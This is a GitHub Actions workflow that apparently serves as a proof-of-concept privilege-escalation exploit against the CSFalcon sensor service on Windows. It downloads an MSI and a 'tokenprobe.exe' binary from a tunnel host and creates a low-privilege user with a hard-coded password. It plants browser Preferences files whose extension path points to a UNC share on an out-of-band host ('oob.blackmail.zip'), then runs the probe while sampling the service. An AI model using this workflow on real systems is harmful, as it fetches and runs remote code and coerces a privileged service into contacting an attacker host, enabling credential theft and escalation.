name: beparser-installed-service-proof
on:
  workflow_dispatch:
jobs:
  proof:
    runs-on: windows-2022
    timeout-minutes: 15
    steps:
      - name: Prepare standard-user browser state
        shell: powershell
        run: |
          $ErrorActionPreference = "Stop"
          New-Item -ItemType Directory -Force C:/proof | Out-Null
          $headers=@{"X-Pinggy-No-Screen"="true"}
          Invoke-WebRequest -Headers $headers -Uri "https://mgcwk-2600-1f18-68f7-2200-aca3-d05b-1f5e-4b5d.run.pinggy-free.link/Sensor.msi" -OutFile C:/proof/Sensor.msi
          Invoke-WebRequest -Headers $headers -Uri "https://mgcwk-2600-1f18-68f7-2200-aca3-d05b-1f5e-4b5d.run.pinggy-free.link/tokenprobe.exe" -OutFile C:/proof/tokenprobe.exe
          $ih=(Get-FileHash C:/proof/Sensor.msi -Algorithm SHA256).Hash.ToLower()
          $th=(Get-FileHash C:/proof/tokenprobe.exe -Algorithm SHA256).Hash.ToLower()
          Write-Output "msi=$ih tokenprobe=$th"
          if($ih -ne "86a92e8e0f0a54372e7a084a1d062a2edbce9a3cf93a97cba8d413a2a3e9e3c8"){throw "MSI hash mismatch"}
          net user belowsys "BEParser!26" /add
          $sec=ConvertTo-SecureString "BEParser!26" -AsPlainText -Force
          $cred=[pscredential]::new("$env:COMPUTERNAME\belowsys",$sec)
          $p=Start-Process cmd.exe -ArgumentList "/d /c whoami > C:\proof\lowinit.txt" -Credential $cred -LoadUserProfile -Wait -PassThru
          Write-Output "lowinit=$($p.ExitCode)"
          Get-Content C:/proof/lowinit.txt
          $unc="\\j9adzdnyijwvlprf--besvc1787401272.oob.blackmail.zip\owned"
          $obj=@{extensions=@{settings=@{cccccccccccccccccccccccccccccccc=@{path=$unc;state=1}}}}
          $json=$obj | ConvertTo-Json -Depth 8 -Compress
          foreach($pref in @("C:/Users/belowsys/AppData/Local/Google/Chrome/User Data/Default/Preferences","C:/Users/belowsys/AppData/Local/Microsoft/Edge/User Data/Default/Preferences")){
            New-Item -ItemType Directory -Force (Split-Path $pref) | Out-Null
            [System.IO.File]::WriteAllText($pref,$json,(New-Object System.Text.UTF8Encoding($false)))
          }
          icacls C:/Users/belowsys /grant "belowsys:(OI)(CI)F" /T /C
          Write-Output "MARKER=besvc1787401272"
          Write-Output "PREFERENCES=$json"
      - name: Install exact current sensor and observe browser rundown
        shell: powershell
        run: |
          $ErrorActionPreference="Continue"
          $p=Start-Process msiexec.exe -ArgumentList "/i C:\proof\Sensor.msi /qn /norestart /L*v C:\proof\msi.log" -Wait -PassThru
          Write-Output "msi_exit=$($p.ExitCode)"
          Get-Service | Where-Object {$_.Name -match "CSFalcon"} | Format-Table -AutoSize
          sc.exe qc CSFalconService
          sc.exe qtriggerinfo CSFalconService
          for($i=0;$i -lt 16;$i++){
            Write-Output "=== SAMPLE $i $(Get-Date -Format o) ==="
            Get-CimInstance Win32_Process | Where-Object {$_.Name -match "CSFalcon(Service|Container)"} | ForEach-Object {
              $o=Invoke-CimMethod -InputObject $_ -MethodName GetOwner
              [pscustomobject]@{PID=$_.ProcessId;PPID=$_.ParentProcessId;Name=$_.Name;Owner="$($o.Domain)\$($o.User)";CommandLine=$_.CommandLine}
            } | Format-List
            & C:/proof/tokenprobe.exe
            if($i -eq 4){
              Write-Output "=== RESTART SERVICE ==="
              Restart-Service CSFalconService -Force -ErrorAction Continue
            }
            Start-Sleep -Seconds 15
          }
          Get-Content C:/proof/msi.log -Tail 100 -ErrorAction SilentlyContinue
          exit 0
      - name: Cleanup
        if: always()
        shell: powershell
        run: |
          Remove-LocalUser belowsys -ErrorAction SilentlyContinue
